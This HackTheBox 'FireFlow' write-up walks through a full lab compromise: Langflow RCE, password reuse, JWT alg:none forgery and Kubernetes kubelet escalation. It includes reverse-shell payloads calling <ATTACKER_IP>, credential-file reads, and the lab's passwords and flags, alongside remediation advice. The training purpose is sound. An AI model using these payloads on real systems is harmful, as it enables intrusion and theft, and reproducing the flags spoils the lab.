---
title: "FireFlow — HackTheBox Penetration Test Writeup"
date: 2026-08-16 20:14:00 +0200
categories: [Writeups, HackTheBox]
tags: [hackthebox, langflow, cve-2026-33017, jwt, kubernetes, rce, credential-reuse, privilege-escalation, kubelet]
description: "A black-box HackTheBox FireFlow write-up covering unauthenticated Langflow RCE, credential reuse, JWT alg:none authentication bypass, and Kubernetes nodes/proxy privilege escalation to root."
pin: false
toc: true
---

> **Authorized lab / spoiler warning:** This write-up documents an intentionally vulnerable HackTheBox lab target used for cybersecurity training. It contains credentials, exploitation steps, flags, and spoilers.
{: .prompt-warning }

**Target:** FireFlow  
**Platform:** HackTheBox  
**Engagement type:** Authorized black-box penetration test  
**Tester:** nour  
**Status:** Interim — engagement paused after root-equivalent compromise because of tester-side VPN instability  
**Overall result:** Full compromise achieved through a privileged Kubernetes pod

---

## Executive Summary

This report documents a penetration test conducted against **FireFlow** (`fireflow.htb`), an internal intelligence-automation platform operated by the fictional **Task Force Nightfall** organization and presented as a HackTheBox lab machine.

The engagement was conducted in black-box fashion, with no credentials or internal documentation provided at the outset.

The assessment identified and exploited a chain of four distinct vulnerabilities, escalating from zero access to full root-equivalent compromise of the underlying host. The attack chain crossed several technology layers:

- a public-facing AI workflow web application;
- the Linux host operating system;
- a custom internal API service;
- a Kubernetes container-orchestration environment.

The tester first obtained unauthenticated code execution through a vulnerable Langflow instance, pivoted from the `www-data` service account to the `nightfall` operating-system user through credential reuse, bypassed authentication on an internal MCP service by forging an unsigned JWT, and finally abused an over-permissioned Kubernetes service account to execute commands as root through the kubelet.

Testing stopped after successful root-level access and capture of the root flag because of tester-side VPN connectivity instability. No persistence, broader lateral movement, or cluster-wide post-exploitation review was performed.

---

## Scope and Methodology

### Scope

The assessment was limited to a single HackTheBox target reachable through the HTB VPN.

- Primary hostname: `fireflow.htb`
- Discovered virtual host: `flow.fireflow.htb`
- Target IP: dynamically reassigned by HTB between machine restarts
- Observed addresses included:
  - `10.129.59.70`
  - `10.129.244.214`
  - `10.129.59.166`
  - `10.129.49.172`
  - `10.129.49.210`
  - `10.129.50.89`

Testing was authorized within the HackTheBox lab environment.

### Methodology

Testing followed a black-box workflow consistent with standard penetration-testing practice:

1. Reconnaissance and service enumeration
2. Web application enumeration and technology fingerprinting
3. CVE research based on identified software and versions
4. Initial exploitation and foothold
5. Local host enumeration and credential discovery
6. Lateral movement through reused credentials
7. Enumeration of internal services
8. Authentication-bypass testing
9. Kubernetes RBAC enumeration
10. Privilege escalation through Kubernetes misconfiguration

All exploitation was performed manually without automated exploitation frameworks such as Metasploit.

---

## Summary of Findings

| ID | Finding | Severity |
|---|---|---|
| F1 | Unauthenticated Remote Code Execution in Langflow 1.8.2 — CVE-2026-33017 | **Critical** |
| F2 | Plaintext Credential Storage and Password Reuse (`www-data` → `nightfall`) | **High** |
| F3 | JWT `alg:none` Signature Bypass in MCP Tool Registry | **Critical** |
| F4 | Over-Permissioned Kubernetes Service Account (`nodes/proxy`) Leading to Root | **Critical** |

---

## Technical Findings and Exploitation Narrative

## Reconnaissance

An initial service scan was performed with Nmap using version detection and default scripts:

```bash
nmap -sV -sC 10.129.244.214
```

Initial scans intermittently reported the host as down. This was eventually traced to a tester-side VPN configuration issue: the active VPN profile did not correspond to the pool required by the lab. Connecting to the correct profile restored connectivity.

A full-port scan was then used to ensure no services were missed:

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.244.214 \
  | grep ^[0-9] \
  | cut -d '/' -f 1 \
  | tr '\n' ',' \
  | sed s/,$//)

nmap -p$ports -sV -sC 10.129.244.214
```

### Results

| Port | State | Service | Version |
|---|---|---|---|
| 22/tcp | open | SSH | OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 |
| 80/tcp | open | HTTP | nginx, redirecting to HTTPS |
| 443/tcp | open | HTTPS | nginx |

The TLS certificate disclosed:

```text
Subject: commonName=fireflow.htb
Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
```

The wildcard SAN suggested that the target likely hosted additional virtual hosts whose content would depend on the supplied `Host` header.

Because `.htb` hostnames are not publicly resolvable, the target was added manually to `/etc/hosts`:

```bash
echo "10.129.244.214 fireflow.htb" | sudo tee -a /etc/hosts
```

Browsing to:

```text
https://fireflow.htb
```

revealed a marketing-style landing page for **FireFlow**, described as an internal intelligence-automation platform for **Task Force Nightfall**.

An **Open Agent** button linked to:

```text
flow.fireflow.htb
```

confirming the wildcard-certificate hypothesis. This hostname was added to `/etc/hosts` as well.

The linked application exposed a chat-style interface at a path similar to:

```text
https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25
```

The page footer identified the application as **Langflow**.

Two important artifacts were obtained immediately:

- the application technology: Langflow;
- a publicly exposed flow UUID:
  `7d84d636-af65-42e4-ac38-26e867052c25`.

The exact Langflow version was disclosed by the application's own API:

```bash
curl -sk https://flow.fireflow.htb/api/v1/version
```

Response:

```json
{
  "version": "1.8.2",
  "main_version": "1.8.2",
  "package": "Langflow"
}
```

---

## Finding 1 — Unauthenticated RCE in Langflow

**Severity:** Critical  
**CVE:** CVE-2026-33017  
**Affected version:** Langflow 1.8.2

### Description

Langflow 1.8.2 was vulnerable to unauthenticated remote code execution through:

```text
/api/v1/build_public_tmp/<flow_id>/flow
```

The endpoint is intended to support publicly embeddable Langflow flows, but the affected implementation allowed a client to submit custom component code that would subsequently be executed by the server.

A valid `flow_id` was required, but one had already been exposed directly in the public-facing playground URL.

### Exploitation

A Netcat listener was started first:

```bash
nc -lvnp 9001
```

A malicious Langflow component containing a Python payload was then submitted to the public build endpoint:

```bash
curl -k -X POST \
  "https://flow.fireflow.htb/api/v1/build_public_tmp/<flow_id>/flow" \
  -H 'Content-Type: application/json' \
  -b 'client_id=attacker' \
  -d '{
    "data": {
      "nodes": [{
        "id": "Exploit-001",
        "type": "genericNode",
        "position": {"x": 0, "y": 0},
        "data": {
          "id": "Exploit-001",
          "type": "ExploitComp",
          "node": {
            "template": {
              "code": {
                "type": "code",
                "required": true,
                "show": true,
                "multiline": true,
                "value": "import os\n\n_x = os.system(\"bash -c '\''bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1'\''\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})",
                "name": "code"
              },
              "_type": "Component"
            },
            "base_classes": ["Data"],
            "display_name": "ExploitComp",
            "name": "ExploitComp",
            "outputs": [{
              "types": ["Data"],
              "name": "o",
              "method": "r"
            }],
            "field_order": ["code"]
          }
        }
      }],
      "edges": []
    }
  }'
```

The request returned a job identifier, and the listener received an inbound connection.

```bash
www-data@fireflow:/var/lib/langflow$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Shell Stabilization

The raw shell was upgraded for stability:

```bash
script /dev/null -c bash
```

Then:

```text
Ctrl+Z
```

followed by:

```bash
stty raw -echo; fg
```

and Enter twice.

### Impact

The vulnerability provided full unauthenticated remote code execution as the application's `www-data` service account and established the initial foothold for the remainder of the engagement.

### Remediation

- Upgrade Langflow to a version that addresses CVE-2026-33017.
- Remove or restrict the vulnerable public-build endpoint where it is not required.
- Place public component-building functionality behind authentication.
- Avoid unnecessarily exposing identifiers required to invoke privileged workflow functionality.

---

## Finding 2 — Plaintext Credentials and Password Reuse

**Severity:** High  
**Pivot:** `www-data` → `nightfall`

With local shell access established, the filesystem was searched for environment files and other common locations for application secrets:

```bash
find / -iname "*.env" 2>/dev/null
```

Results included:

```text
/etc/langflow/.env
/etc/systemd/system/k3s.service.env
/run/flannel/subnet.env
```

The Langflow environment file contained plaintext credentials:

```bash
cat /etc/langflow/.env
```

Relevant values:

```text
LANGFLOW_AUTO_LOGIN=False
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
```

The local account list was reviewed:

```bash
cat /etc/passwd
```

The only normal interactive user identified was:

```text
nightfall:x:1000:1000::/home/nightfall:/bin/bash
```

The disclosed Langflow superuser password was tested against the `nightfall` system account:

```bash
ssh nightfall@fireflow.htb
```

Password:

```text
n1ghtm4r3_b4_n1ghtf4ll
```

Authentication succeeded, confirming password reuse between the application and operating-system layers.

The user flag was then accessible:

```bash
nightfall@fireflow:~$ cat user.txt
eeaa8ab18e7868c509dbc8af28c86328
```

### Impact

Credential reuse converted a restricted web-service foothold into stable SSH access as a normal operating-system user. This exposed the user's home directory and the configuration artifacts that enabled the next stage of the compromise.

### Remediation

- Enforce unique credentials across application and OS accounts.
- Do not store sensitive passwords in broadly readable plaintext configuration files.
- Use a secrets-management system where possible.
- Restrict environment-file permissions to the minimum required service account.
- Rotate all credentials exposed during the engagement.

---

## Finding 3 — JWT `alg:none` Signature Bypass

**Severity:** Critical  
**Target:** MCP AI Tool Registry

Enumeration of the `nightfall` home directory revealed a hidden MCP configuration directory:

```bash
ls -la ~/.mcp
cat ~/.mcp/config.json
```

Configuration:

```json
{
  "server": "http://<TARGET_IP>:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

The service on port `30080` had not appeared in the original external scan, indicating that it was intended to be reachable only from the host's internal network.

Its version endpoint was queried:

```bash
curl -s http://<TARGET_IP>:30080/api/v1/version | python3 -m json.tool
```

Response:

```json
{
  "service": "MCP AI Tool Registry",
  "auth": {
    "type": "JWT",
    "supported_algorithms": ["HS256", "none"]
  },
  "endpoints": [
    "POST /mcp [MCP JSON-RPC 2.0]",
    "POST /api/v1/auth",
    "GET /api/v1/tools",
    "POST /api/v1/tools [admin]"
  ]
}
```

### Vulnerability

The service explicitly accepted the JWT `none` algorithm.

When a JWT verifier accepts `alg:none`, an attacker may be able to submit an unsigned token whose claims are trusted without cryptographic validation.

A valid low-privilege token was first obtained using the credentials from the MCP configuration:

```bash
curl -s -X POST http://<TARGET_IP>:30080/api/v1/auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'
```

Decoding its payload showed:

```json
{
  "sub": "langflow-bot",
  "role": "user"
}
```

The normal token was rejected by the administrative endpoint with:

```json
{
  "detail": "Admin role required"
}
```

### Forging an Administrator Token

An unsigned token was crafted manually.

Header:

```bash
echo -n '{"alg":"none","typ":"JWT"}' \
  | base64 \
  | tr '+/' '-_' \
  | tr -d '='
```

Result:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
```

Payload:

```bash
echo -n '{"sub":"attacker","role":"admin"}' \
  | base64 \
  | tr '+/' '-_' \
  | tr -d '='
```

Result:

```text
eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9
```

The resulting unsigned token was:

```bash
ADMIN_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9."
```

It was submitted to the admin-only tool-registration endpoint:

```bash
curl -s -X POST http://<TARGET_IP>:30080/api/v1/tools \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{"name":"test","description":"test","code":"print(1)"}'
```

Response:

```json
{
  "status": "registered",
  "name": "test"
}
```

The registered code was then executed through the MCP JSON-RPC endpoint:

```bash
curl -s -X POST http://<TARGET_IP>:30080/mcp \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"test","arguments":{}}}'
```

Response:

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "content": [
      {
        "type": "text",
        "text": "1\n"
      }
    ],
    "isError": false
  }
}
```

This confirmed that the forged administrator token could register and execute arbitrary code.

A reverse-shell tool was then registered:

```bash
curl -s -X POST http://<TARGET_IP>:30080/api/v1/tools \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{"name":"shell","description":"debug shell","code":"import os\nos.system(\"bash -c '\''bash -i >& /dev/tcp/<ATTACKER_IP>/9002 0>&1'\''\")"}'
```

And triggered:

```bash
curl -s -X POST http://<TARGET_IP>:30080/mcp \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"shell","arguments":{}}}'
```

The callback provided a shell as:

```text
uid=1000(mcp) gid=1000(mcp) groups=1000(mcp)
mcp-server-54464cb475-29ztf
```

The hostname format and subsequent enumeration confirmed that this process was running inside a Kubernetes pod.

### Impact

The JWT validation flaw resulted in complete authentication bypass for an internal administrative API and arbitrary code execution inside the MCP Kubernetes workload.

### Remediation

- Disable the JWT `none` algorithm entirely.
- Explicitly allow-list only intended cryptographic signing algorithms.
- Prefer properly configured asymmetric algorithms such as RS256 or ES256 where appropriate.
- Review the JWT verification implementation for algorithm-confusion and signature-validation flaws.
- Rotate credentials exposed in the MCP configuration.

---

## Finding 4 — Kubernetes `nodes/proxy` Privilege Escalation to Root

**Severity:** Critical  
**Cause:** Kubernetes RBAC misconfiguration

Once inside the `mcp-server` pod, the Kubernetes environment was enumerated:

```bash
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
env
```

The environment confirmed the in-cluster API location:

```text
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_SERVICE_PORT=443
```

The mounted service-account token identified the workload as service account:

```text
mcp-sa
```

in the `default` namespace.

### Enumerating Effective Permissions

The service account's effective permissions were queried through the Kubernetes `SelfSubjectRulesReview` API:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
API=https://10.43.0.1:443

curl -sk -X POST \
  "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "apiVersion": "authorization.k8s.io/v1",
    "kind": "SelfSubjectRulesReview",
    "spec": {
      "namespace": "default"
    }
  }'
```

The response disclosed:

```json
{
  "verbs": ["get"],
  "apiGroups": [""],
  "resources": ["nodes/proxy"]
}
```

### Why `nodes/proxy` Was Dangerous

The `nodes/proxy` subresource permission allowed the service account to communicate with the node's kubelet through the node proxy path.

This created a path to functionality that the service account would not otherwise have been permitted to use directly against arbitrary workloads.

The node's pod listing was queried and saved:

```bash
curl -sk "https://<TARGET_IP>:10250/pods" \
  -H "Authorization: Bearer $TOKEN" \
  > /tmp/pods.json
```

The output was filtered for workloads meeting two conditions:

- `securityContext.privileged == true`
- a `hostPath` volume was mounted.

One high-impact workload was identified:

```text
monitoring/prometheus-prometheus-node-exporter-nmntq
```

Container:

```text
node-exporter
```

Host paths included:

```text
/proc
/sys
/
```

The pod was running privileged and mounted the host root filesystem.

### Kubelet Exec

The kubelet exec functionality was then reached through a WebSocket connection using the service-account token.

Conceptually, the target path was:

```text
wss://<NODE_IP>:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter
```

with parameters for command execution and the subprotocol:

```text
v4.channel.k8s.io
```

A short Python WebSocket client was used to invoke commands.

Testing with:

```bash
python3 kube_exec.py "id"
```

returned:

```text
uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
```

This confirmed root execution inside the privileged pod.

Because the host root filesystem was mounted at `/host`, the host's root flag could then be read:

```bash
python3 kube_exec.py "cat /host/root/root/root.txt"
```

Result:

```text
0f39150152581c356eb3998d9a0a734f
```

### Impact

The Kubernetes RBAC misconfiguration allowed a low-privilege application workload to reach kubelet functionality and execute commands in a privileged pod.

Because that pod mounted the host filesystem, this resulted in full root-equivalent compromise of the underlying FireFlow host.

### Remediation

- Remove `nodes/proxy` from service accounts without an explicit operational requirement.
- Review cluster-wide RBAC for node-level permissions.
- Avoid privileged containers with broad `hostPath` mounts, particularly `/`.
- Apply Kubernetes Pod Security Standards.
- Restrict network access to kubelet port `10250`.
- Use NetworkPolicies and other segmentation controls to prevent unrelated workloads from reaching node-management interfaces.

---

## Risk Summary and Attack Chain

The four findings formed a complete attack chain:

```text
[Unauthenticated attacker]
        |
        | F1: CVE-2026-33017
        | Unauthenticated Langflow RCE
        v
[www-data shell on FireFlow]
        |
        | F2: Plaintext credential + password reuse
        v
[nightfall SSH shell]
        |
        | F3: JWT alg:none forgery
        v
[mcp shell inside Kubernetes pod]
        |
        | F4: nodes/proxy + privileged hostPath pod
        v
[Root-equivalent access to FireFlow host]
```

The chain demonstrates the importance of defense in depth. Each transition crossed an intended trust boundary, but weaknesses at every layer enabled the compromise to continue:

1. vulnerable internet-facing software;
2. reused credentials across security boundaries;
3. insecure JWT validation on an internal API;
4. excessive Kubernetes service-account permissions;
5. a privileged monitoring pod with direct host filesystem access.

---

## Recommendations

### Immediate — Critical Priority

- Patch Langflow or disable the affected public-build endpoint until a fixed release is deployed.
- Remove JWT `none` support from the MCP Tool Registry.
- Revoke the `nodes/proxy` permission from `mcp-sa`.
- Rotate all credentials exposed during the assessment.

### Short-Term

- Remove hardcoded credentials from plaintext `.env` files.
- Adopt a secrets-management solution with runtime secret injection.
- Enforce unique credentials across application and operating-system accounts.
- Audit all Kubernetes service accounts for excessive RBAC grants.
- Review node-level permissions such as `nodes/proxy` and `nodes/log`.

### Longer-Term

- Apply Kubernetes Pod Security Standards cluster-wide.
- Limit privileged pods to explicitly approved namespaces and use cases.
- Reduce or eliminate broad `hostPath` mounts.
- Implement NetworkPolicies and internal segmentation between workloads.
- Restrict kubelet access to authorized management components.
- Establish a recurring vulnerability-management and patching process for third-party software.

---

## Engagement Notes and Limitations

- The target IP changed on multiple occasions because of HTB machine restarts.
- `/etc/hosts` mappings and callback addresses therefore had to be updated between sessions.
- Testing stopped after root access was confirmed because of tester-side VPN instability.
- No persistence mechanisms were installed.
- No destructive or denial-of-service testing was performed.
- No broader cluster-wide audit or lateral movement to other nodes or namespaces was completed.
- All exploitation was performed manually without automated exploitation frameworks.
- This document therefore represents an interim report despite successful full compromise of the target host.

---

## Appendix — Command Log

### Reconnaissance

```bash
nmap -sV -sC <TARGET_IP>

ports=$(nmap -p- --min-rate=1000 -T4 <TARGET_IP> \
  | grep ^[0-9] \
  | cut -d '/' -f 1 \
  | tr '\n' ',' \
  | sed s/,$//)

nmap -p$ports -sV -sC <TARGET_IP>

echo "<TARGET_IP> fireflow.htb flow.fireflow.htb" \
  | sudo tee -a /etc/hosts

curl -sk https://flow.fireflow.htb/api/v1/version
```

### Finding 1 — Langflow RCE

```bash
nc -lvnp 9001
```

```bash
curl -k -X POST "https://flow.fireflow.htb/api/v1/build_public_tmp/<flow_id>/flow" \
  -H "Content-Type: application/json" \
  -b "client_id=attacker" \
  -d '{
    "data": {
      "nodes": [{
        "id": "Exploit-001",
        "type": "genericNode",
        "position": {"x":0,"y":0},
        "data": {
          "id": "Exploit-001",
          "type": "ExploitComp",
          "node": {
            "template": {
              "code": {
                "type": "code",
                "required": true,
                "show": true,
                "multiline": true,
                "value": "import os\n\n_x = os.system(\"bash -c '\''bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1'\''\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n display_name=\"X\"\n outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n def r(self)->Data:\n  return Data(data={})",
                "name": "code"
              },
              "_type": "Component"
            },
            "base_classes": ["Data"],
            "display_name": "ExploitComp",
            "name": "ExploitComp",
            "outputs": [{"types":["Data"],"name":"o","method":"r"}],
            "field_order": ["code"]
          }
        }
      }],
      "edges": []
    }
  }'
```

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
# Enter twice
```

### Finding 2 — Credential Discovery and Reuse

```bash
find / -iname "*.env" 2>/dev/null
cat /etc/langflow/.env
cat /etc/passwd
ssh nightfall@fireflow.htb
cat user.txt
sudo -l
ls -la ~/.mcp
```

### Finding 3 — JWT `alg:none`

```bash
cat ~/.mcp/config.json

curl -s http://<TARGET_IP>:30080/api/v1/version \
  | python3 -m json.tool
```

```bash
curl -s -X POST http://<TARGET_IP>:30080/api/v1/auth \
  -H "Content-Type: application/json" \
  -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'
```

```bash
echo -n '{"alg":"none","typ":"JWT"}' \
  | base64 | tr '+/' '-_' | tr -d '='

echo -n '{"sub":"attacker","role":"admin"}' \
  | base64 | tr '+/' '-_' | tr -d '='
```

```bash
ADMIN_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9."
```

```bash
curl -s -X POST http://<TARGET_IP>:30080/api/v1/tools \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{"name":"shell","description":"debug shell","code":"import os\nos.system(\"bash -c '\''bash -i >& /dev/tcp/<ATTACKER_IP>/9002 0>&1'\''\")"}'
```

```bash
curl -s -X POST http://<TARGET_IP>:30080/mcp \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"shell","arguments":{}}}'
```

### Finding 4 — Kubernetes Privilege Escalation

```bash
id
hostname

cat /var/run/secrets/kubernetes.io/serviceaccount/token
env

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
API=https://10.43.0.1:443
```

```bash
curl -sk -X POST \
  "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```

```bash
curl -sk "https://<TARGET_IP>:10250/pods" \
  -H "Authorization: Bearer $TOKEN" \
  > /tmp/pods.json
```

```bash
python3 kube_exec.py "id"
python3 kube_exec.py "cat /host/root/root/root.txt"
```

---

_This write-up documents an authorized HackTheBox lab engagement only._
